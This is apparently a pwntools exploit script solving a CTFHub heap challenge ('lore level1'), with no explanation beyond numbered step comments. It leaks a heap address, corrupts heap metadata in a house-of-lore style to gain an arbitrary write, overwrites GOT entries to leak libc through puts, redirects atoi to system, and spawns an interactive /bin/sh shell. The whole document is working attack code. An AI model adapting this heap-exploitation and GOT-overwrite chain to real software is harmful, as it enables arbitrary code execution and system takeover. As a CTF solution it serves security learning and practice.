from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF('./data/bin/heap23_26_ctfhub_lore_level1')
libc = elf.libc
p = process("./data/bin/heap23_26_ctfhub_lore_level1")
free_got = elf.got['free']
puts_got = elf.got['puts']
atoi_got = elf.got['atoi']

def add(size):
    p.sendline(b'1')
    p.sendafter(b'size:\n',str(size).encode('utf-8'))

def dele(idx):
    p.sendline(b'3')
    p.send(str(idx).encode('utf-8'))

def edit(idx,context):
    p.sendline(b'2')
    p.sendline(str(idx).encode('utf-8'))
    p.send(context)

def change_name(name):
    p.sendline(b'4')
    p.send(name)

def change_mesg(size,new_mesg,mesg):
    p.sendline(b'5')
    p.recvuntil(b'saved at ')
    a = p.recvline()[:-1]
    print('leak--->',a)
    heap_addr = int(a,16)
    payload = p64(heap_addr+0xb0+0xd0)
    mesg = payload + mesg
    print('---->',hex(heap_addr))
    p.send(str(size).encode('utf-8'))
    p.send(new_mesg)
    p.send(mesg)
    return a

p.sendlineafter(b'writer:\n',b'a');p.sendlineafter(b'book?\n',b'a');add(0xC8)#step.1
payload = p64(0x6020A0-0x10);heap_addr = change_mesg(200,b'11',payload);heap_addr = int(heap_addr,16)#step.2
payload = p64(heap_addr-0x10)+p64(0x6020A0+0x8)+p64(0)+p64(0x6020A0-0x10);change_name(payload)#step.3
add(0xb0);add(0xb0)#step.4
payload = b'a'*0x40+p64(heap_addr+0xb0+0xc0+0xd0)+b'a'*0x18+p64(free_got)+p64(puts_got)+p64(atoi_got);edit(2,payload)#step.5
edit(0,p64(0x4006A0))#step.6
dele(1)#step.7
p.recvuntil(b'delete?\n');puts_addr = p.recvline()[:-1]#step.8
puts_addr = int.from_bytes(puts_addr,'little');libc_addr = puts_addr - libc.symbols['puts'];system_addr = libc_addr + libc.symbols['system'];edit(2,p64(system_addr))#step.9
p.send(b'/bin/sh\x00')#step.10
p.interactive()